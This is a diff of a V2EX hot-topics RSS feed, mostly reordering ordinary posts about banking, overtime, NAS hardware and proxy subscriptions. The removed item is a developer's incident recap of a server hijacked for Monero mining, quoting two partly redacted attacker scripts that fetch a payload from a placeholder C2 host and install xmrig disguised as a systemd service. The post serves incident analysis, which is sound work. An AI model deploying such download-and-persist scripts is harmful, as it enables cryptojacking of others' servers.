@@ -4,7 +4,7 @@
     <title>V2EX Hot Topics</title>
     <link>https://www.v2ex.com/?tab=hot</link>
     <description>Hot topics from V2EX</description>
-    <lastBuildDate>Sat, 06 Dec 2025 15:35:41 GMT</lastBuildDate>
+    <lastBuildDate>Sat, 06 Dec 2025 16:12:31 GMT</lastBuildDate>
     <item>
       <title>足不出户，开通香港星展银行账户</title>
       <link>https://www.v2ex.com/t/1177257</link>
@@ -100,15 +100,6 @@
 </description>
     </item>
     <item>
-      <title>工人因为不能加班，吵起来的， V2EX 的各位估计没见过吧。</title>
-      <link>https://www.v2ex.com/t/1177279</link>
-      <guid>v2ex-1177279</guid>
-      <pubDate>Sat, 06 Dec 2025 07:56:50 GMT</pubDate>
-      <description>&lt;p&gt;我们厂，我见过挺多的，因为不给她们加班，她们吵到老板那里。&lt;/p&gt;
-&lt;p&gt;单休，一天 9.5 小时她们还不够，还要求让她们加班。&lt;/p&gt;
-</description>
-    </item>
-    <item>
       <title>一种平凡的生活</title>
       <link>https://www.v2ex.com/t/1177236</link>
       <guid>v2ex-1177236</guid>
@@ -191,6 +182,15 @@
 </description>
     </item>
     <item>
+      <title>工人因为不能加班，吵起来的， V2EX 的各位估计没见过吧。</title>
+      <link>https://www.v2ex.com/t/1177279</link>
+      <guid>v2ex-1177279</guid>
+      <pubDate>Sat, 06 Dec 2025 07:56:50 GMT</pubDate>
+      <description>&lt;p&gt;我们厂，我见过挺多的，因为不给她们加班，她们吵到老板那里。&lt;/p&gt;
+&lt;p&gt;单休，一天 9.5 小时她们还不够，还要求让她们加班。&lt;/p&gt;
+</description>
+    </item>
+    <item>
       <title>想买铭凡 n5 nas，但是涨价了，求其他 nas 整机推荐</title>
       <link>https://www.v2ex.com/t/1177230</link>
       <guid>v2ex-1177230</guid>
@@ -198,128 +198,16 @@
       <description>最近想着在自己的老古董 nas 上部署一些有意思的项目，比如知识库，数据库 BaaS 之类的服务。目前手上这台老古董群晖 ds220+ 一跑就爆 cpu...&lt;br /&gt;&lt;br /&gt;没办法，只能想着能不能找一些 cpu 高一点的 nas ，逛了一圈整机 nas ，看到不少 cpu 性能高一些的比如 n355 ，最终在 B 站看到了铭凡 n5 ，cpu 是 amd 锐龙 7 255 。比其他的整机 nas 性能都强，瞬间眼睛挪不开了。价格当时也美丽，只要 3500 左右，给媳妇说要买这个，拿来学习用的，她说等发工资再买。&lt;br /&gt;&lt;br /&gt;结果过几天她跟我说涨价了，涨到了 4400 。说太贵了先不买了，我的心情瞬间跌山谷，本来想买台 cpu 性能强点的，来跑一些服务玩玩 ai ，学习一下 agent 的玩法提升一下技术，结果现在止步不前了。&lt;br /&gt;&lt;br /&gt;兄弟们，还有什么其他性能相当的 nas 推荐一下</description>
     </item>
     <item>
-      <title>React 漏洞中招，服务器被用来挖矿</title>
-      <link>https://www.v2ex.com/t/1177265</link>
-      <guid>v2ex-1177265</guid>
-      <pubDate>Sat, 06 Dec 2025 05:31:34 GMT</pubDate>
-      <description>&lt;p&gt;早上收到阿里云短信，说有一台服务器被用来挖矿，排查发现哥们用漏洞来注入用于挖门罗币。
-做开发 12 年了第一次遇到服务器被人搞，说实话还有点刺激还有点兴奋。&lt;/p&gt;
-&lt;p&gt;复盘一下经过，大家共赏：&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;1 、收到阿里云报警说有服务器用于挖矿&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;2 、阿里云后台定位到了大致的挖矿文件&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;阿里云报警&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://i.imgur.com/BRn1L6j.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;3 、上服务器一看&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;文件目录&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://i.imgur.com/Z3f4Jgd.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;好家伙确实多了不少东西，有两个核心的攻击脚本，一个是 &lt;a href=&quot;http://python1.sh&quot; rel=&quot;nofollow&quot;&gt;python1.sh&lt;/a&gt; ，一个是 &lt;a href=&quot;http://sex.sh&quot; rel=&quot;nofollow&quot;&gt;sex.sh&lt;/a&gt; ，直接脱敏后放出脚本大家共赏：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://python1.sh&quot; rel=&quot;nofollow&quot;&gt;python1.sh&lt;/a&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;#!/bin/bash
-
-# ========== 脱敏说明 ==========
-# 1. 攻击者 IP/端口替换为[攻击者 C2 服务器 IP:端口]
-# 2. 恶意程序随机文件名替换为[恶意程序随机文件名]
-# 3. 下载/执行类恶意逻辑添加注释，仅保留结构
-# 4. 核心攻击特征已标注，无任何可执行的恶意代码
-
-export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
-mkdir -p /tmp
-cd /tmp
-touch /usr/local/bin/writeablex &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; cd /usr/local/bin/
-touch /usr/libexec/writeablex &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; cd /usr/libexec/
-touch /usr/bin/writeablex &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; cd /usr/bin/
-rm -rf /usr/local/bin/writeablex /usr/libexec/writeablex /usr/bin/writeablex
-export PATH=$PATH:$(pwd)
-
-l64=&quot;[攻击者 C2 服务器 IP:端口]/?h=[C2_IP]&amp;amp;p=[端口]&amp;amp;t=tcp&amp;amp;a=l64&amp;amp;stage=true&quot;  # Linux x86_64 架构
-l32=&quot;[攻击者 C2 服务器 IP:端口]/?h=[C2_IP]&amp;amp;p=[端口]&amp;amp;t=tcp&amp;amp;a=l32&amp;amp;stage=true&quot;  # Linux x86 32 位架构
-a64=&quot;[攻击者 C2 服务器 IP:端口]/?h=[C2_IP]&amp;amp;p=[端口]&amp;amp;t=tcp&amp;amp;a=a64&amp;amp;stage=true&quot;  # ARM64 架构
-a32=&quot;[攻击者 C2 服务器 IP:端口]/?h=[C2_IP]&amp;amp;p=[端口]&amp;amp;t=tcp&amp;amp;a=a32&amp;amp;stage=true&quot;  # ARM32 架构
-
-v=&quot;[恶意程序随机文件名]&quot;
-rm -rf $v
-
-ARCH=$(uname -m)
-if [ ${ARCH}x = &quot;x86_64x&quot; ]; then
-    # (curl -fsSL -m180 $l64 -o $v||wget -T180 -q $l64 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$l64&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-elif [ ${ARCH}x = &quot;i386x&quot; ]; then
-    # (curl -fsSL -m180 $l32 -o $v||wget -T180 -q $l32 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$l32&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-elif [ ${ARCH}x = &quot;i686x&quot; ]; then
-    # (curl -fsSL -m180 $l32 -o $v||wget -T180 -q $l32 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$l32&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-elif [ ${ARCH}x = &quot;aarch64x&quot; ]; then
-    # (curl -fsSL -m180 $a64 -o $v||wget -T180 -q $a64 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$a64&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-elif [ ${ARCH}x = &quot;armv7lx&quot; ]; then
-    # (curl -fsSL -m180 $a32 -o $v||wget -T180 -q $a32 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$a32&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-fi
-
-# chmod +x $v
-# (nohup $(pwd)/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup ./$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup /usr/bin/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup /usr/libexec/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup /usr/local/bin/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup /tmp/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个主要是为了下载第二层的恶意程序，从实际结果来看，恶意程序伪装成了 docker ，在 tmp 文件夹下跑，由于是二进制文件，目前还没有进一步查验它在做啥，不过大概率也是挖矿，因为看到了一个挖矿的 config 文件。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://sex.sh&quot; rel=&quot;nofollow&quot;&gt;sex.sh&lt;/a&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;#!/bin/bash
-
-# ========== 脱敏说明 ==========
-# 1. 挖矿池地址/钱包 ID/TLS 指纹替换为占位符，无法用于实际挖矿；
-# 2. 下载/解压/执行类恶意命令全部注释，仅保留攻击结构；
-# 3. 服务器环境特征（如$(pwd)）替换为占位符，避免溯源风险；
-
-# Configuration
-TAR_FILE=&quot;kal.tar.gz&quot;
-EXTRACT_DIR=&quot;xmrig-6.24.0&quot;（ 6.24.0 ）
-BINARY_PATH=&quot;[当前路径]/$EXTRACT_DIR/xmrig&quot;
-ARGS=&quot;--url [恶意挖矿池地址] --user [攻击者挖矿钱包 ID] --pass next --donate-level 0 --tls --tls-fingerprint [恶意 TLS 指纹]&quot;
-SERVICE_NAME=&quot;system-update-service&quot;  
-
-# Download and setup if not already present
-if [ ! -f &quot;$BINARY_PATH&quot; ]; then
-    # curl -L -o &quot;$TAR_FILE&quot; --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot; https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-    # tar xvzf &quot;$TAR_FILE&quot;
-fi
-
-# chmod +x &quot;$BINARY_PATH&quot;
-
-# Attempt systemd setup
-INSTALLED_SYSTEMD=0
-if [ &quot;$(id -u)&quot; -eq 0 ] &amp;amp;&amp;amp; command -v systemctl &amp;gt;/dev/null 2&amp;gt;&amp;amp;1; then
-    echo &quot;Root privileges detected. Attempting systemd setup...&quot;
-    
-    SERVICE_FILE=&quot;/etc/systemd/system/${SERVICE_NAME}.service&quot;
-    
-    # cat &amp;lt;&amp;lt;EOF &amp;gt; &quot;$SERVICE_FILE&quot;
-    # [Unit]
-    # Description=System Update Service
-    # After=network.target
-    # 
-    # [Service]
-    # Type=simple
-    # ExecStart=${BINARY_PATH} ${ARGS}
-    # Restart=always
-    # RestartSec=10
-    # User=root
-    # 
-    # [Install]
-    # WantedBy=multi-user.target
-    # EOF
-
-    # systemctl daemon-reload
-    # systemctl enable &quot;$SERVICE_NAME&quot;
-    # systemctl start &quot;$SERVICE_NAME&quot;
-    
-    if systemctl is-active --quiet &quot;$SERVICE_NAME&quot;; then
-        echo &quot;Service started via systemd.&quot;
-        INSTALLED_SYSTEMD=1
-    fi
-fi
-
-# Fallback to nohup
-if [ $INSTALLED_SYSTEMD -eq 0 ]; then
-    echo &quot;Starting with nohup...&quot;
-    # nohup &quot;$BINARY_PATH&quot; $ARGS &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
-fi
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;是的你没看错，这个脚本甚至自带注释，甚至还 echo 了进度……不知道这个人从哪下的示例代码分发的……逻辑比较清晰，把挖矿程序伪装成系统服务。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;4 、处理&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;由于感染的服务器是公司很边缘的、用于内部一些脑洞项目 poc 测试的小服务器，所以在权限管理上十分松懈，直接用 root 用户部署的各类小 Demo App ，导致这次漏洞也轻松的让攻击者获得了 root 权限，可能还替换了部分系统文件，机器肯定是不能留了……&lt;/p&gt;
-&lt;p&gt;下一步排查一下上面在跑的服务，备份数据，销毁重建。&lt;/p&gt;
+      <title>梯子开了订阅链接阅后即焚怎么解决？</title>
+      <link>https://www.v2ex.com/t/1177289</link>
+      <guid>v2ex-1177289</guid>
+      <pubDate>Sat, 06 Dec 2025 09:14:54 GMT</pubDate>
+      <description>&lt;p&gt;某 h 云，订阅链接只能用一次就失效了。每次更新，有几个设备就得获取几次链接，完全废掉同步功能了。有 better practice 还是用脚投票换机场？&lt;/p&gt;
+&lt;p&gt;&quot;&quot;&quot;
+DEC 5th
+尊敬的用户您好：我们将对订阅开启阅后即焚功
+能，请所有用户尽快从官网获取新订阅，请关闭客户端系统代理功能后重新导入订阅或删除节点后重新导入。给您带来不便敬请谅解，感谢您对 F*Cloud 的支持！
+&quot;&quot;&quot;&lt;/p&gt;
 </description>
     </item>
   </channel>
